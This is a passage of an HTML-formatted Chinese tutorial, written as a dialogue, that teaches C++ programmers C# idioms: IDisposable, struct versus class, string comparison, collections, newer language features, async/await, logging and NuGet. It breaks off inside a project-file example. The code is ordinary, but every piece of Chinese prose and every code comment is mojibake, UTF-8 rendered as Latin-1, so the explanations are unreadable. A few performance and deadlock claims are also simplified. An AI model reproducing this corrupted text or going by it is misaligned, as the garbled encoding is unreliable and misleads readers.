<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// C++æ€ç»´ï¼ˆé”™è¯¯ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">BadExample</span>
{
    <span class="hljs-keyword">private</span> List&lt;<span class="hljs-built_in">int</span>&gt; data = <span class="hljs-keyword">new</span> List&lt;<span class="hljs-built_in">int</span>&gt;();
    
    ~BadExample()  <span class="hljs-comment">// é”™è¯¯ï¼ä¸è¦å†™ææ„å‡½æ•°</span>
    {
        <span class="hljs-comment">// æƒ³æ‰‹åŠ¨æ¸…ç†</span>
        data.Clear();
        data = <span class="hljs-literal">null</span>;
    }
}

<span class="hljs-comment">// C#æ€ç»´ï¼ˆæ­£ç¡®ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">GoodExample</span>
{
    <span class="hljs-keyword">private</span> List&lt;<span class="hljs-built_in">int</span>&gt; data = <span class="hljs-keyword">new</span> List&lt;<span class="hljs-built_in">int</span>&gt;();
    
    <span class="hljs-comment">// å¦‚æœæŒæœ‰éæ‰˜ç®¡èµ„æºæ‰éœ€è¦IDisposable</span>
    <span class="hljs-keyword">private</span> FileStream file;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Cleanup</span>()</span>
    {
        <span class="hljs-comment">// ä¸éœ€è¦æ‰‹åŠ¨æ¸…ç†dataï¼ŒGCä¼šå¤„ç†</span>
        <span class="hljs-comment">// åªéœ€è¦å¤„ç†ç‰¹æ®Šèµ„æº</span>
        <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)
        {
            file.Dispose();
            file = <span class="hljs-literal">null</span>;
        }
    }
}
</code></pre>
<p><strong>å°æ</strong>ï¼šé‚£æˆ‘æ€ä¹ˆçŸ¥é“ä»€ä¹ˆæ—¶å€™éœ€è¦æ‰‹åŠ¨æ¸…ç†ï¼Ÿ</p>
<p><strong>ç‹å“¥</strong>ï¼šè®°ä½è¿™ä¸ª<strong>é»„é‡‘æ³•åˆ™</strong>ï¼š</p>
<ol>
<li><strong>çº¯æ‰˜ç®¡å¯¹è±¡</strong>ï¼ˆéƒ½æ˜¯C#ç±»ï¼‰ï¼šäº¤ç»™GC</li>
<li><strong>éæ‰˜ç®¡èµ„æº</strong>ï¼ˆæ–‡ä»¶ã€ç½‘ç»œã€æ•°æ®åº“è¿æ¥ï¼‰ï¼šå®ç°<code>IDisposable</code></li>
<li><strong>å¤§å¯¹è±¡</strong>ï¼šè€ƒè™‘å¯¹è±¡æ± </li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// æ­£ç¡®çš„èµ„æºç®¡ç†</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ResourceHandler</span> : <span class="hljs-title">IDisposable</span>
{
    <span class="hljs-keyword">private</span> FileStream _file;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _disposed = <span class="hljs-literal">false</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Process</span>()</span>
    {
        <span class="hljs-keyword">using</span> (<span class="hljs-keyword">var</span> stream = <span class="hljs-keyword">new</span> FileStream(<span class="hljs-string">"data.txt"</span>, FileMode.Open))
        {
            <span class="hljs-comment">// è‡ªåŠ¨é‡Šæ”¾</span>
        }
        
        <span class="hljs-comment">// æˆ–è€…</span>
        <span class="hljs-keyword">using</span> <span class="hljs-keyword">var</span> reader = <span class="hljs-keyword">new</span> StreamReader(<span class="hljs-string">"file.txt"</span>);
        <span class="hljs-comment">// ç¦»å¼€ä½œç”¨åŸŸè‡ªåŠ¨é‡Šæ”¾</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Dispose</span>()</span>
    {
        Dispose(<span class="hljs-literal">true</span>);
        GC.SuppressFinalize(<span class="hljs-keyword">this</span>);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Dispose</span>(<span class="hljs-params"><span class="hljs-built_in">bool</span> disposing</span>)</span>
    {
        <span class="hljs-keyword">if</span> (!_disposed)
        {
            <span class="hljs-keyword">if</span> (disposing)
            {
                _file?.Dispose();
            }
            _disposed = <span class="hljs-literal">true</span>;
        }
    }
}
</code></pre>
<h2 data-id="heading-1">ç±»å‹ç³»ç»Ÿï¼šå¼•ç”¨ç±»å‹ vs å€¼ç±»å‹</h2>
<p><strong>å°æ</strong>ï¼šæˆ‘ç»å¸¸æä¸æ¸…ä»€ä¹ˆæ—¶å€™ç”¨<code>class</code>ï¼Œä»€ä¹ˆæ—¶å€™ç”¨<code>struct</code>ã€‚</p>
<p><strong>ç‹å“¥</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªå…³é”®åŒºåˆ«ï¼æˆ‘æ€»ç»“äº†ä¸€ä¸ª<strong>å†³ç­–æ ‘</strong>ç»™ä½ ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">éœ€è¦ç±»å‹å—ï¼Ÿ
â”œâ”€â”€ éœ€è¦ç»§æ‰¿æˆ–å¤šæ€å—ï¼Ÿ
â”‚   â”œâ”€â”€ æ˜¯ â†’ ç”¨<span class="hljs-keyword">class</span>
â”‚   â””â”€â”€ å¦ â†’ 
â”‚       â”œâ”€â”€ å¯¹è±¡å¾ˆå°ï¼ˆ&lt;<span class="hljs-number">16</span>å­—èŠ‚ï¼‰å—ï¼Ÿ
â”‚       â”‚   â”œâ”€â”€ æ˜¯ â†’ è€ƒè™‘<span class="hljs-keyword">struct</span>
â”‚       â”‚   â””â”€â”€ å¦ â†’ ç”¨<span class="hljs-keyword">class</span>
â”‚       â””â”€â”€ éœ€è¦å€¼è¯­ä¹‰ï¼ˆèµ‹å€¼æ—¶å¤åˆ¶ï¼‰å—ï¼Ÿ
â”‚           â”œâ”€â”€ æ˜¯ â†’ ç”¨<span class="hljs-keyword">struct</span>
â”‚           â””â”€â”€ å¦ â†’ ç”¨<span class="hljs-keyword">class</span>
</code></pre>
<p><strong>å°æ</strong>ï¼šå€¼è¯­ä¹‰æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</p>
<p><strong>ç‹å“¥</strong>ï¼šçœ‹è¿™ä¸ªä¾‹å­å°±æ˜ç™½äº†ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// struct - å€¼è¯­ä¹‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> Point
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> X, Y;
    
    <span class="hljs-comment">// æ¨èï¼šè®©structä¸å¯å˜</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Point</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> x, <span class="hljs-built_in">int</span> y</span>)</span> =&gt; (X, Y) = (x, y);
}

Point p1 = <span class="hljs-keyword">new</span> Point(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>);
Point p2 = p1;  <span class="hljs-comment">// å¤åˆ¶æ•´ä¸ªç»“æ„ä½“</span>
p2.X = <span class="hljs-number">30</span>;      <span class="hljs-comment">// ä¸å½±å“p1</span>
Console.WriteLine(p1.X); <span class="hljs-comment">// è¾“å‡º10</span>

<span class="hljs-comment">// class - å¼•ç”¨è¯­ä¹‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name;
}

Person person1 = <span class="hljs-keyword">new</span> Person { Name = <span class="hljs-string">"Alice"</span> };
Person person2 = person1;  <span class="hljs-comment">// åªå¤åˆ¶å¼•ç”¨</span>
person2.Name = <span class="hljs-string">"Bob"</span>;      <span class="hljs-comment">// ä¿®æ”¹çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡</span>
Console.WriteLine(person1.Name); <span class="hljs-comment">// è¾“å‡ºBobï¼</span>
</code></pre>
<p><strong>ç‹å“¥</strong>ï¼šè¿˜æœ‰å‡ ä¸ª<strong>è¡€çš„æ•™è®­</strong>è¦è®°ä½ï¼š</p>
<ol>
<li><strong>ä¸è¦åœ¨å¤§structé‡Œæ”¾å¼•ç”¨ç±»å‹</strong>ï¼ˆä¼šæœ‰æ„å¤–å…±äº«ï¼‰</li>
<li><strong>é¿å…é¢‘ç¹è£…ç®±æ‹†ç®±</strong></li>
<li><strong>structé€‚åˆå°å‹çš„ã€é€»è¾‘ä¸Šè¡¨ç¤ºå•ä¸ªå€¼çš„æ•°æ®</strong></li>
</ol>
<h2 data-id="heading-2">å­—ç¬¦ä¸²å¤„ç†ï¼šå¿˜è®°C++çš„ä¹ æƒ¯</h2>
<p><strong>å°æ</strong>ï¼šæˆ‘ç»å¸¸ç”¨<code>==</code>æ¯”è¾ƒå­—ç¬¦ä¸²ï¼Œæœ‰ä»€ä¹ˆé—®é¢˜å—ï¼Ÿ</p>
<p><strong>ç‹å“¥</strong>ï¼šåœ¨C++é‡Œï¼Œä½ å¯èƒ½ä¹ æƒ¯äº†ç”¨<code>strcmp</code>ã€‚åœ¨C#é‡Œï¼Œå­—ç¬¦ä¸²æ¯”è¾ƒæœ‰å‡ ä¸ª<strong>å‘</strong>ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-built_in">string</span> s1 = <span class="hljs-string">"hello"</span>;
<span class="hljs-built_in">string</span> s2 = <span class="hljs-string">"HELLO"</span>;

<span class="hljs-comment">// âŒ é—®é¢˜1ï¼šå¤§å°å†™æ•æ„Ÿ</span>
<span class="hljs-keyword">if</span> (s1 == s2)  <span class="hljs-comment">// falseï¼Œä½†ä½ å¯èƒ½æƒ³è¦true</span>

<span class="hljs-comment">// âœ… æ­£ç¡®åšæ³•</span>
<span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.Equals(s1, s2, StringComparison.OrdinalIgnoreCase))

<span class="hljs-comment">// âŒ é—®é¢˜2ï¼šæ–‡åŒ–æ•æ„Ÿæ€§</span>
<span class="hljs-built_in">string</span> s3 = <span class="hljs-string">"straÃŸe"</span>;
<span class="hljs-built_in">string</span> s4 = <span class="hljs-string">"strasse"</span>;
<span class="hljs-keyword">if</span> (s3 == s4)  <span class="hljs-comment">// falseï¼ˆå¾·è¯­æ–‡åŒ–ä¸­ç›¸åŒï¼‰</span>

<span class="hljs-comment">// âœ… æ˜ç¡®æŒ‡å®šæ¯”è¾ƒè§„åˆ™</span>
<span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.Equals(s3, s4, StringComparison.InvariantCulture))

<span class="hljs-comment">// âŒ é—®é¢˜3ï¼šå­—ç¬¦ä¸²ä¸å¯å˜</span>
<span class="hljs-built_in">string</span> text = <span class="hljs-string">"hello"</span>;
text.ToUpper();  <span class="hljs-comment">// è¿”å›æ–°å­—ç¬¦ä¸²ï¼Œtextä»ç„¶æ˜¯"hello"</span>

<span class="hljs-comment">// âœ… éœ€è¦é‡æ–°èµ‹å€¼</span>
text = text.ToUpper();
</code></pre>
<p><strong>ç‹å“¥</strong>ï¼šè¿˜æœ‰ä¸€ä¸ªé‡è¦å»ºè®®ï¼š<strong>å¤šç”¨å­—ç¬¦ä¸²æ’å€¼</strong>ï¼Œå°‘ç”¨å­—ç¬¦ä¸²è¿æ¥ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// âŒ æ€§èƒ½å·®</span>
<span class="hljs-built_in">string</span> message = <span class="hljs-string">"Hello "</span> + name + <span class="hljs-string">", you are "</span> + age + <span class="hljs-string">" years old"</span>;

<span class="hljs-comment">// âœ… æ€§èƒ½å¥½ï¼Œå¯è¯»æ€§å¥½</span>
<span class="hljs-built_in">string</span> message = <span class="hljs-string">$"Hello <span class="hljs-subst">{name}</span>, you are <span class="hljs-subst">{age}</span> years old"</span>;

<span class="hljs-comment">// å¤§é‡æ‹¼æ¥ç”¨StringBuilder</span>
<span class="hljs-keyword">var</span> sb = <span class="hljs-keyword">new</span> StringBuilder();
<span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++)
{
    sb.Append(i).Append(<span class="hljs-string">", "</span>);
}
<span class="hljs-built_in">string</span> result = sb.ToString();
</code></pre>
<h2 data-id="heading-3">é›†åˆç±»çš„ä½¿ç”¨ï¼šå¿˜è®°æ‰‹åŠ¨æ•°ç»„ç®¡ç†</h2>
<p><strong>å°æ</strong>ï¼šæˆ‘æ€»æƒ³ç”¨æ•°ç»„ï¼Œç„¶åè‡ªå·±ç®¡ç†å¤§å°ã€‚</p>
<p><strong>ç‹å“¥</strong>ï¼šè¿™æ˜¯C++åé—ç—‡ï¼åœ¨C#é‡Œï¼Œ<strong>ä¼˜å…ˆä½¿ç”¨æ³›å‹é›†åˆ</strong>ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// âŒ C++æ€ç»´</span>
<span class="hljs-built_in">int</span>[] array = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>[<span class="hljs-number">10</span>];
<span class="hljs-built_in">int</span> count = <span class="hljs-number">0</span>;
<span class="hljs-comment">// ... æ‰‹åŠ¨ç®¡ç†æ’å…¥ã€åˆ é™¤</span>

<span class="hljs-comment">// âœ… C#æ–¹å¼</span>
List&lt;<span class="hljs-built_in">int</span>&gt; list = <span class="hljs-keyword">new</span> List&lt;<span class="hljs-built_in">int</span>&gt;();
list.Add(<span class="hljs-number">1</span>);
list.Add(<span class="hljs-number">2</span>);
list.Remove(<span class="hljs-number">1</span>);

<span class="hljs-comment">// å­—å…¸çš„ä½¿ç”¨</span>
Dictionary&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">int</span>&gt; dict = <span class="hljs-keyword">new</span> Dictionary&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">int</span>&gt;();
dict[<span class="hljs-string">"key"</span>] = <span class="hljs-number">10</span>;

<span class="hljs-comment">// å®‰å…¨è®¿é—®</span>
<span class="hljs-keyword">if</span> (dict.TryGetValue(<span class="hljs-string">"key"</span>, <span class="hljs-keyword">out</span> <span class="hljs-built_in">int</span> <span class="hljs-keyword">value</span>))
{
    <span class="hljs-comment">// ä½¿ç”¨value</span>
}

<span class="hljs-comment">// é›†åˆåˆå§‹åŒ–å™¨ï¼ˆè¯­æ³•ç³–ï¼‰</span>
<span class="hljs-keyword">var</span> numbers = <span class="hljs-keyword">new</span> List&lt;<span class="hljs-built_in">int</span>&gt; { <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span> };
<span class="hljs-keyword">var</span> person = <span class="hljs-keyword">new</span> Person { Name = <span class="hljs-string">"John"</span>, Age = <span class="hljs-number">30</span> };
</code></pre>
<p><strong>ç‹å“¥</strong>ï¼šè®°ä½è¿™äº›<strong>é›†åˆä½¿ç”¨æ³•åˆ™</strong>ï¼š</p>
<ol>
<li><strong>æŸ¥è¯¢å¤šã€ä¿®æ”¹å°‘</strong> â†’ ç”¨<code>List&lt;T&gt;</code></li>
<li><strong>å¿«é€ŸæŸ¥æ‰¾</strong> â†’ ç”¨<code>Dictionary&lt;TKey, TValue&gt;</code></li>
<li><strong>éœ€è¦æ’åº</strong> â†’ ç”¨<code>SortedDictionary</code>æˆ–<code>SortedList</code></li>
<li><strong>å”¯ä¸€æ€§è¦æ±‚</strong> â†’ ç”¨<code>HashSet&lt;T&gt;</code></li>
<li><strong>å…ˆè¿›å…ˆå‡º</strong> â†’ ç”¨<code>Queue&lt;T&gt;</code></li>
<li><strong>åè¿›å…ˆå‡º</strong> â†’ ç”¨<code>Stack&lt;T&gt;</code></li>
</ol>
<h2 data-id="heading-4">ç°ä»£C#ç‰¹æ€§ï¼šæ‹¥æŠ±å˜åŒ–</h2>
<p><strong>å°æ</strong>ï¼šæˆ‘çœ‹åˆ°å¾ˆå¤š<code>=&gt;</code>ã€<code>var</code>ã€<code>$""</code>ï¼Œè¿™äº›éœ€è¦éƒ½å­¦å—ï¼Ÿ</p>
<p><strong>ç‹å“¥</strong>ï¼š<strong>å¿…é¡»å­¦</strong>ï¼è¿™äº›éƒ½æ˜¯æé«˜ç”Ÿäº§åŠ›çš„åˆ©å™¨ã€‚æˆ‘ç»™ä½ ä¸ª<strong>æ¸è¿›å­¦ä¹ è·¯å¾„</strong>ï¼š</p>
<h3 data-id="heading-5">é˜¶æ®µ1ï¼šç«‹å³æŒæ¡çš„</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. varç±»å‹æ¨æ–­</span>
<span class="hljs-keyword">var</span> list = <span class="hljs-keyword">new</span> List&lt;<span class="hljs-built_in">string</span>&gt;();  <span class="hljs-comment">// ç¼–è¯‘å™¨çŸ¥é“ç±»å‹</span>
<span class="hljs-keyword">var</span> count = <span class="hljs-number">10</span>;                  <span class="hljs-comment">// çŸ¥é“æ˜¯int</span>

<span class="hljs-comment">// 2. å±æ€§åˆå§‹åŒ–å™¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-string">"Unknown"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Age { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
}

<span class="hljs-comment">// 3. å­—ç¬¦ä¸²æ’å€¼</span>
Console.WriteLine(<span class="hljs-string">$"Result: <span class="hljs-subst">{Calculate()}</span>"</span>);

<span class="hljs-comment">// 4. ç©ºæ¡ä»¶è¿ç®—ç¬¦</span>
<span class="hljs-built_in">string</span> name = person?.Name ?? <span class="hljs-string">"Default"</span>;
</code></pre>
<h3 data-id="heading-6">é˜¶æ®µ2ï¼šå°½å¿«å­¦ä¹ çš„</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. æ¨¡å¼åŒ¹é…ï¼ˆC# 7+ï¼‰</span>
<span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">is</span> <span class="hljs-built_in">int</span> i &amp;&amp; i &gt; <span class="hljs-number">0</span>)
{
    <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨i</span>
}

<span class="hljs-comment">// 2. switchè¡¨è¾¾å¼</span>
<span class="hljs-built_in">string</span> result = <span class="hljs-keyword">value</span> <span class="hljs-keyword">switch</span>
{
    <span class="hljs-number">1</span> =&gt; <span class="hljs-string">"One"</span>,
    <span class="hljs-number">2</span> =&gt; <span class="hljs-string">"Two"</span>,
    _ =&gt; <span class="hljs-string">"Many"</span>
};

<span class="hljs-comment">// 3. è®°å½•ç±»å‹ï¼ˆC# 9+ï¼‰</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title">Person</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> FirstName, <span class="hljs-built_in">string</span> LastName</span>)</span>;

<span class="hljs-comment">// 4. withè¡¨è¾¾å¼</span>
<span class="hljs-keyword">var</span> newPerson = person <span class="hljs-keyword">with</span> { LastName = <span class="hljs-string">"Smith"</span> };
</code></pre>
<h3 data-id="heading-7">é˜¶æ®µ3ï¼šæ·±åº¦æŒæ¡çš„</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. å¯ç©ºå¼•ç”¨ç±»å‹ï¼ˆC# 8+ï¼‰</span>
<span class="hljs-meta">#nullable enable</span>
<span class="hljs-built_in">string</span>? nullableString = <span class="hljs-literal">null</span>;  <span class="hljs-comment">// æ˜ç¡®å¯ç©º</span>
<span class="hljs-built_in">string</span> nonNullString = <span class="hljs-string">"hello"</span>; <span class="hljs-comment">// æ˜ç¡®éç©º</span>

<span class="hljs-comment">// 2. é¡¶çº§è¯­å¥ï¼ˆC# 9+ï¼‰</span>
<span class="hljs-comment">// ä¸éœ€è¦å†™namespaceã€classã€Mainæ–¹æ³•</span>
Console.WriteLine(<span class="hljs-string">"Hello World!"</span>);

<span class="hljs-comment">// 3. æ–‡ä»¶èŒƒå›´çš„å‘½åç©ºé—´ï¼ˆC# 10+ï¼‰</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">MyApp</span>;
<span class="hljs-comment">// æ•´ä¸ªæ–‡ä»¶éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´é‡Œ</span>
</code></pre>
<h2 data-id="heading-8">å¼‚æ­¥ç¼–ç¨‹ï¼šä»å›è°ƒåœ°ç‹±åˆ°å¤©å ‚</h2>
<p><strong>å°æ</strong>ï¼š<code>async/await</code>çœ‹èµ·æ¥åƒé»‘é­”æ³•ï¼Œä¸å¤ªæ•¢ç”¨ã€‚</p>
<p><strong>ç‹å“¥</strong>ï¼šè¿™æ˜¯C#æœ€æ£’çš„ç‰¹æ€§ä¹‹ä¸€ï¼æƒ³è±¡ä¸€ä¸‹ï¼Œä½ ä»<strong>åŸå§‹ç¤¾ä¼š</strong>å‡çº§åˆ°äº†<strong>ç°ä»£ç¤¾ä¼š</strong>ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ğŸ˜° C++/C#æ—§æ–¹å¼ï¼ˆå›è°ƒåœ°ç‹±ï¼‰</span>
client.GetData(url, result =&gt;
{
    ProcessData(result, processed =&gt;
    {
        SaveData(processed, saved =&gt;
        {
            UpdateUI(saved);
        });
    });
});

<span class="hljs-comment">// ğŸ˜Š C# async/awaitæ–¹å¼</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ProcessAsync</span>()</span>
{
    <span class="hljs-keyword">var</span> data = <span class="hljs-keyword">await</span> client.GetDataAsync(url);
    <span class="hljs-keyword">var</span> processed = <span class="hljs-keyword">await</span> ProcessDataAsync(data);
    <span class="hljs-keyword">var</span> saved = <span class="hljs-keyword">await</span> SaveDataAsync(processed);
    UpdateUI(saved);
}
</code></pre>
<p><strong>ç‹å“¥</strong>ï¼šè®°ä½è¿™äº›<strong>async/awaité»„é‡‘æ³•åˆ™</strong>ï¼š</p>
<ol>
<li><strong>asyncä¼ æŸ“æ€§</strong>ï¼šä¸€æ—¦ç”¨äº†asyncï¼Œè°ƒç”¨é“¾ä¸Šé€šå¸¸éƒ½éœ€è¦async</li>
<li><strong>å‘½åè§„èŒƒ</strong>ï¼šå¼‚æ­¥æ–¹æ³•ä»¥<code>Async</code>ç»“å°¾</li>
<li><strong>é¿å…async void</strong>ï¼šé™¤äº†äº‹ä»¶å¤„ç†å™¨ï¼Œéƒ½ç”¨<code>async Task</code></li>
<li><strong>é…ç½®ç­‰å¾…</strong>ï¼š<code>ConfigureAwait(false)</code>é¿å…æ­»é”</li>
<li><strong>ä¸è¦é˜»å¡</strong>ï¼šç»å¯¹ä¸è¦ç”¨<code>.Result</code>æˆ–<code>.Wait()</code></li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// âŒ é”™è¯¯åšæ³•</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">GetData</span>()</span>
{
    <span class="hljs-keyword">return</span> GetDataAsync().Result;  <span class="hljs-comment">// å¯èƒ½å¯¼è‡´æ­»é”ï¼</span>
}

<span class="hljs-comment">// âœ… æ­£ç¡®åšæ³•</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;<span class="hljs-built_in">string</span>&gt; <span class="hljs-title">GetDataAsync</span>()</span>
{
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> httpClient.GetStringAsync(url);
}

<span class="hljs-comment">// âœ… åœ¨æ§åˆ¶å°ç¨‹åºå¯ä»¥è¿™æ ·</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span>
{
    <span class="hljs-keyword">var</span> data = <span class="hljs-keyword">await</span> GetDataAsync();
    Console.WriteLine(data);
}
</code></pre>
<h2 data-id="heading-9">è°ƒè¯•å’Œæ’é”™ï¼šæ–°çš„æ€ç»´æ–¹å¼</h2>
<p><strong>å°æ</strong>ï¼šåœ¨C#é‡Œè°ƒè¯•æœ‰ä»€ä¹ˆä¸åŒï¼Ÿ</p>
<p><strong>ç‹å“¥</strong>ï¼šè°ƒè¯•ä½“éªŒæ›´å¥½ï¼Œä½†è¦æ³¨æ„ä¸€äº›æ–°é—®é¢˜ï¼š</p>
<h3 data-id="heading-10">1. <strong>å¼‚å¸¸è€Œä¸æ˜¯é”™è¯¯ç </strong></h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// âŒ C++æ€ç»´</span>
<span class="hljs-built_in">int</span> result = DoOperation();
<span class="hljs-keyword">if</span> (result != SUCCESS)
{
    <span class="hljs-comment">// å¤„ç†é”™è¯¯</span>
}

<span class="hljs-comment">// âœ… C#æ–¹å¼</span>
<span class="hljs-keyword">try</span>
{
    <span class="hljs-keyword">await</span> DoOperationAsync();
}
<span class="hljs-keyword">catch</span> (OperationCanceledException ex)
{
    <span class="hljs-comment">// ä»»åŠ¡è¢«å–æ¶ˆ</span>
}
<span class="hljs-keyword">catch</span> (HttpRequestException ex)
{
    <span class="hljs-comment">// ç½‘ç»œé”™è¯¯</span>
}
<span class="hljs-keyword">catch</span> (Exception ex)  <span class="hljs-comment">// æœ€åå…œåº•</span>
{
    _logger.LogError(ex, <span class="hljs-string">"æ“ä½œå¤±è´¥"</span>);
    <span class="hljs-keyword">throw</span>;  <span class="hljs-comment">// é‡æ–°æŠ›å‡ºï¼Œä¿ç•™å †æ ˆ</span>
}
</code></pre>
<h3 data-id="heading-11">2. <strong>ä½¿ç”¨æ—¥å¿—è€Œä¸æ˜¯printf</strong></h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ç»“æ„åŒ–æ—¥å¿—</span>
_logger.LogInformation(<span class="hljs-string">"ç”¨æˆ· {UserId} æ‰§è¡Œäº†æ“ä½œ {Action}"</span>, 
    userId, actionName);

<span class="hljs-comment">// å¸¦æœ‰å¼‚å¸¸ä¿¡æ¯çš„æ—¥å¿—</span>
<span class="hljs-keyword">try</span>
{
    <span class="hljs-comment">// ...</span>
}
<span class="hljs-keyword">catch</span> (Exception ex)
{
    _logger.LogError(ex, <span class="hljs-string">"å¤„ç†ç”¨æˆ· {UserId} æ—¶å‡ºé”™"</span>, userId);
}
</code></pre>
<h3 data-id="heading-12">3. <strong>åˆ©ç”¨Visual Studioçš„å¼ºå¤§åŠŸèƒ½</strong></h3>
<ul>
<li><strong>æ¡ä»¶æ–­ç‚¹</strong>ï¼šå³é”®æ–­ç‚¹è®¾ç½®æ¡ä»¶</li>
<li><strong>æ•°æ®æ–­ç‚¹</strong>ï¼šç›‘è§†å¯¹è±¡å˜åŒ–</li>
<li><strong>å³æ—¶çª—å£</strong>ï¼šæ‰§è¡Œä»»æ„ä»£ç </li>
<li><strong>è¯Šæ–­å·¥å…·</strong>ï¼šå†…å­˜åˆ†æã€æ€§èƒ½åˆ†æ</li>
</ul>
<h2 data-id="heading-13">é¡¹ç›®ç®¡ç†ï¼šå¿˜è®°makefile</h2>
<p><strong>å°æ</strong>ï¼šæ€ä¹ˆç®¡ç†C#é¡¹ç›®ä¾èµ–ï¼Ÿ</p>
<p><strong>ç‹å“¥</strong>ï¼šå¿˜è®°makefileå’Œæ‰‹åŠ¨æ‹·è´dllå§ï¼C#æœ‰<strong>NuGet</strong>ï¼š</p>
<ol>
<li><strong>ä¾èµ–ç®¡ç†</strong>ï¼šåœ¨<code>.csproj</code>æ–‡ä»¶é‡Œå®šä¹‰</li>
<li><strong>åŒ…æ¢å¤</strong>ï¼šè‡ªåŠ¨ä¸‹è½½ä¾èµ–</li>
<li><strong>ç‰ˆæœ¬æ§åˆ¶</strong>ï¼šè¯­ä¹‰åŒ–ç‰ˆæœ¬ç®¡ç†</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- é¡¹ç›®æ–‡ä»¶ç¤ºä¾‹ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Project</span> <span class="hljs-attr">Sdk</span>=<span class="hljs-string">"Microsoft.NET.Sdk"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">PropertyGroup</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">TargetFramework</span>&gt;</span>net6.0<span class="hljs-tag">&lt;/<span class="hljs-name">TargetFramework</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Nullable</span>&gt;</span>enable<span class="hljs-tag">&lt;/<span class="hljs-name">Nullable</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">PropertyGroup</span>&gt;</span>
  
  <span class="hljs-tag">&lt;<span class="hljs-name">ItemGroup</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- æ·»åŠ NuGetåŒ… --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">PackageReference</span> <span class="hljs-attr">Include</span>=<span class="hljs-string">"Newtonsoft.Json"</span> <span class="hljs-attr">Version</span>=<span class="hljs-string">"13.0.1"</span> /&gt;</span>
